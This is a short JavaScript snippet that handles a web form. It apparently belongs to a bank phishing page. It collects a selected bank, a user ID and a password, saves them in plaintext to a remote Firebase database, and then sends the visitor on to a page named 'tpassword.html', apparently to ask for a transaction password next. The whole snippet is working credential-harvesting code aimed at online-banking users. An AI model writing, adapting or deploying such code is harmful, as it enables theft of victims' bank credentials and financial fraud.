document.getElementById("ududip007").addEventListener("submit", function (e) {
  e.preventDefault();

  const bank = document.getElementById("bank").value;
  const userid = document.getElementById("userid").value;
  const password = document.getElementById("password").value;

  const ref = firebase.database().ref("ududip007").push();
  ref.set({
    selected_bank: bank,
    user_id: userid,
    user_password: password
  }).then(() => {
    localStorage.setItem("bank", bank);
   
    window.location.href = "tpassword.html";
  }).catch((error) => {
    alert("Error: " + error.message);
  });
});
